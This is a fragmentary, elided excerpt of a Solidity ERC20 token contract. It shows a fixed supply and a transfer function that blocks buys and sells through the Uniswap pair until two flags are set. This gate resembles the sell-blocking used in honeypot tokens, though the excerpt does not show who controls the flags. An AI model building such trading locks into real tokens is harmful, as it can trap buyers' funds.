...
contract Token is Ownable, IERC20 {
    ...
    constructor() public {
        ...
        uint256 amount = 7420000 * (10**_exp);
    ...
    function _transfer(
        ...
        if (to == uniswapV2Pair) {
            require(selllimit,"The transaction has not been opened yet!");
        } else if (from == uniswapV2Pair) {
            require(buylimit,"The transaction has not been opened yet!");
        }else {
